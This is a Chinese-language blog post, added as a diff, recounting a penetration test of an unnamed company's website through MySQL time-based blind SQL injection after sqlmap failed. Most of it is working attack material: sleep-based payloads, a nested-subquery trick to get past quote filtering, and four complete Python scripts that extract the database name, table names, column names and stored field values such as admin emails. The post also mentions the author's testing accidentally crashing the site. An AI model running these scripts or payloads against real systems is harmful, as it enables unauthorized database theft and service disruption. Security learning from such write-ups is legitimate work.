@@ -1,0 +1,338 @@
+---
+title: 记一次渗透某企业遇到的sql延时盲注启发
+date: 2021-08-17 22:11:17
+tags: 
+     - web学习 
+categories:
+     - web学习 
+     - 学习
+
+
+---
+
+# 记一次渗透某企业遇到的sql延时盲注启发
+
+​		**主要是记录一下自己写的脚本2333，只能说sqlmap真不是万能的2333.**
+
+## 0x01 注入
+
+​		首先，某站用awvs扫出来个延时注入，payload是if(now()=sysdate(),sleep(15),0)，我一看这不mysql延时注入吗，直接sqlmap跑不就完事了，然而事情好像没这么简单，即使我指定了数据库是mysql，方式是延时盲注，mysql也跑不出来，我tm直接疑惑，随后bp抓包试了试。
+
+![image-20210909112210988](image-20210909112210988.png)
+
+## 0x02 bp测试
+
+​		用bp抓包测试了下，延时是sleep()里的2倍，和payload显示是正确的，我寻思这这也没问题了，sqlmap怎么跑不了？
+
+![image-20210909113259509](image-20210909113259509.png)
+
+​		于是我用经典查询数据库的语句if(ascii(substr(database(),1,1))>57,sleep(4),0)，设置sleep为4，一看不得了，这延时怎么翻了10倍，又想起了刚刚sqlmap跑的时候貌似提示延时那部分没收到返回包。
+
+![image-20210909114002169](image-20210909114002169.png)
+
+​		我觉得可能是这延时多了10倍，所以sqlmap才判断不出来，然后接着测试，有趣的一幕发生了，我连续发送多个包去测试，结果那网站崩了
+
+![image-20210909142027847](image-20210909142027847.png)
+
+​		可能设置延时太大，发多了就造成dos了2333，没办法只能等下午测试。
+
+## 0x03 py脚本
+
+​		随后测试了一下，如果把sleep()设置成0.2的话，延时也会缩小1/10，曲线救国，又可以继续测试了.
+
+![image-20210909142740509](image-20210909142740509.png)
+
+​	不过sqlmap没得跑的话（也许可能是我不会操作？），只能自己写脚本上了，去网上搞了个post延时注入的脚本，自己改了改，挂vps跑，一气呵成，下面是跑数据库名的脚本。
+
+```python
+#时间盲注post脚本
+import requests
+import time
+from requests.packages.urllib3.exceptions import InsecureRequestWarning,InsecurePlatformWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)
+value ="0123456789abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&^@_.-!"
+result=""
+
+
+def database_len():
+    for n in range(1,20):#测试数据库长度，自己设置范围
+        url = "***"
+        data_payload="database()"
+        payload = "if(length({0})={1},sleep(0.1),0)".format(data_payload, n) #payload
+        print (str(payload))
+        data = {"***": payload}
+        start_time = time.time()
+        html = requests.post(url=url, data=data,verify=False) #免除ssl验证
+        end_time = time.time()
+        use_time = end_time - start_time #求出请求前后的时间差来判断是否延时了
+        print (str(use_time))
+        if use_time > 1.5:
+            print("......数据库长度为:"+ str(n))
+            #print("延时为"+(str(use_time)))
+            return n
+
+def get_data(length):
+    global result
+    url = "***"
+    for n in range(1,length):
+        for v in value:
+            data_payload="database()"
+            payload = "if(ascii(substr({0},{1},1))={2},sleep(0.1),0)".format(data_payload,n,ord(v))
+            print (str(payload))
+            data = {"***": payload}
+            start_time = time.time()
+            html = requests.post(url=url, data=data,verify=False)
+            end_time = time.time()
+            use_time = end_time - start_time
+            if use_time >1.5:
+                result += v
+                print("数据库名："+result)
+                break
+    return result
+
+
+url = "***"
+len=database_len()
+f=open('result.txt','a',encoding='utf-8')
+f.write("数据库长度："+str(len))
+f.close()
+database_name=get_data(len+1)
+f=open('result.txt','a',encoding='utf-8')
+f.write("数据库名字："+str(database_name))
+f.close()
+```
+
+![image-20210909143527323](image-20210909143527323.png)
+
+​		还学到个后台脚本挂vps的技巧，xxx.out是把输出重定向的文件，可以记录输出日志，也可以不用这个
+
+```
+ nohup python3 -u xxx.py > xxx.out 2>&1 &
+```
+
+​		不过注出数据库名字后又遇到了个问题，注表名时如果用
+
+```
+ascii(substr((select table_name from information_schema.tables where table_schema='数据库名' limit 0,1),1,1))<117
+```
+
+这个payload，会直接返回404
+
+![image-20210909150535737](image-20210909150535737.png)
+
+​		把数据库名换成database()，试试了下，居然成功了，说明可能是引号有问题，不知道问题出在那里。
+
+![image-20210909150940447](image-20210909150940447.png)
+
+​		于是写了爆破表名的脚本：
+
+```python
+import requests
+import time
+from requests.packages.urllib3.exceptions import InsecureRequestWarning,InsecurePlatformWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)
+value ="0123456789abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&^@_.-!"
+result=""
+
+
+
+
+def get_data(length,table_num):
+    global result
+    url = "***"
+    table_name_new=""
+    for n in range(1,length):
+        
+        for v in value:
+            data_payload="(select table_name from information_schema.tables where table_schema=database() limit {0},1)".format(table_num)
+            #payload = "if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<117,sleep(0.1),0)".format(data_payload,n,ord(v))
+            payload = "if(ascii(substr({0},{1},1))={2},sleep(0.1),0)".format(data_payload,n,ord(v))
+            print ("test:"+str(payload))
+            data = {"**": payload}
+            start_time = time.time()
+            html = requests.post(url=url, data=data,verify=False)
+            end_time = time.time()
+            use_time = end_time - start_time
+            if use_time >1.5:
+                table_name_new += v
+                print("第 "+str(table_num)+" 个表名:"+table_name_new)
+                break
+    return table_name_new
+
+
+url = "***"
+
+for table_num in range(0,30):
+    tablet_name=get_data(20,table_num)
+    f=open('result_table.txt','a',encoding='utf-8')
+    f.write("第 "+str(table_num)+" 个表名:"+str(tablet_name)+'\n')
+    f.close()
+
+
+
+```
+
+​		挂vps上跑美滋滋
+
+![image-20210909155622285](image-20210909155622285.png)
+
+## 0x04 套娃盲注爆列
+
+​		到了爆列的时候又出现了刚刚那个问题，就是如果知道表名的话使用
+
+```
+ascii(substr((select column_name from information_schema.columns where table_name=‘表名’ limit 3,1),1,1))=105
+```
+
+这个payload的话，也会像刚刚那样返回404，果然还是引号的问题，去网上看了看其他的payload，于是又看了看mysql 8.0的新注入payload，都不行，因为里面都有引号，于是又试下url编码，还是不行，这时我突然想到一个办法，如果拿表名用
+
+```
+(select table_name from information_schema.tables where table_schema=database() limit 0,1)
+```
+
+(代表查询数据库的第一个表)这个语句代替呢？没想到还居然成功了，这操作我在网上都没看到过2333，我直呼套娃？！
+
+![image-20210909161107138](image-20210909161107138.png)
+
+ 然后爆列的payload就是:
+
+```
+if(ascii(substr((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() limit 0,1)  limit 3,1),1,1))<105,sleep(2),0)
+```
+
+以此写了个py脚本
+
+```python
+import requests
+import time
+from requests.packages.urllib3.exceptions import InsecureRequestWarning,InsecurePlatformWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)
+value ="0123456789abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&^@_.-!"
+result=""
+
+
+def get_data(length,table_num,lie_num):#列名长度，第几个表，第几列
+    global result
+    url = "***"
+    lie_name_new=""
+    flag_lie = 0
+    for n in range(1,length):
+        
+        for v in value:
+            flag_lie = 0
+
+            data_payload="(select table_name from information_schema.tables where table_schema=database() limit {0},1)".format(table_num)
+            #爆列ascii(substr((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() limit 13,1) limit 0,1),1,1))=105
+            lie_payload="(select column_name from information_schema.columns where table_name={0} limit {1},1)".format(data_payload,lie_num)
+            #payload = "if(ascii(substr({0},{1},1))={2},sleep(0.1),0)".format(data_payload,n,ord(v))
+
+            payload = "if(ascii(substr({0},{1},1))={2},sleep(0.1),0)".format(lie_payload,n,ord(v))
+            print ("test:"+str(payload))
+            data = {"**": payload}
+            start_time = time.time()
+            html = requests.post(url=url, data=data,verify=False)
+            end_time = time.time()
+            use_time = end_time - start_time
+            if use_time >1.5:
+                lie_name_new += v
+                print("第 "+str(table_num)+" 个表名的第"+str(lie_num)+"列名:"+str(lie_name_new)+'\n')
+                flag_lie = 1
+                break
+        
+        if (flag_lie==0):
+            print ("1")
+            return lie_name_new
+        
+    return lie_name_new
+
+
+url = "***"
+table_num=13
+for lie_num in range(0,10):
+    lie_name=get_data(20,table_num,lie_num)
+    f=open('result_table_lie.txt','a',encoding='utf-8')
+    f.write("第 "+str(table_num)+" 个表名的第"+str(lie_num)+"列名:"+str(lie_name)+'\n')
+    f.close()
+
+
+
+```
+
+​	挂vps轻松搞定
+
+![image-20210909162155209](image-20210909162155209.png)
+
+
+
+​	最后爆字段，因为爆字段的payload只要知道表名和列名就行，没有引号，因此可以直接写脚本爆，payload为
+
+```
+ascii(substr((select 列名 from users 表名 0,1),1,1))=68
+```
+
+py脚本
+
+```python
+import requests
+import time
+from requests.packages.urllib3.exceptions import InsecureRequestWarning,InsecurePlatformWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)
+value ="0123456789abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&^@_.-!"
+result=""
+
+
+
+
+def get_data(length,ziduan_num,tablet_name_set,lie_name_set):
+    global result
+    url = "****"
+    ziduan_name_new=""
+    ziduan_flag=0
+    for n in range(1,length):
+        
+        for v in value:
+            ziduan_flag=0
+
+            #if(ascii(substr((select email from ecs_admin_user limit 0,1),1,1))<68,sleep(0.1),0)
+            data_payload="(select {0} from {1} limit {2},1)".format(lie_name_set,tablet_name_set,ziduan_num)
+            #payload = "if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<117,sleep(0.1),0)".format(data_payload,n,ord(v))
+            payload = "if(ascii(substr({0},{1},1))={2},sleep(0.1),0)".format(data_payload,n,ord(v))
+            print ("test:"+str(payload))
+            data = {"**": payload}
+            start_time = time.time()
+            html = requests.post(url=url, data=data,verify=False)
+            end_time = time.time()
+            use_time = end_time - start_time
+            if use_time >1.5:
+                ziduan_name_new += v
+                ziduan_flag=1
+
+                print("表"+tablet_name_set+"的列"+lie_name_set+"的第 "+str(ziduan_num)+" 个字段:"+str(ziduan_name_new)+'\n')
+                break
+
+        if (ziduan_flag==0):
+            print ("1")
+            return ziduan_name_new
+
+    return ziduan_name_new
+
+
+url = "***"
+tablet_name_set="***"
+lie_name_set="***"
+for ziduan_num in range(0,10):
+    ziduan_name=get_data(20,ziduan_num,tablet_name_set,lie_name_set)
+    f=open('result_table_lie_ziduan.txt','a',encoding='utf-8')
+    f.write("表"+tablet_name_set+"的列"+lie_name_set+"的第 "+str(ziduan_num)+" 个字段:"+str(ziduan_name)+'\n')
+    f.close()
+
+
+
+```
+
+
+
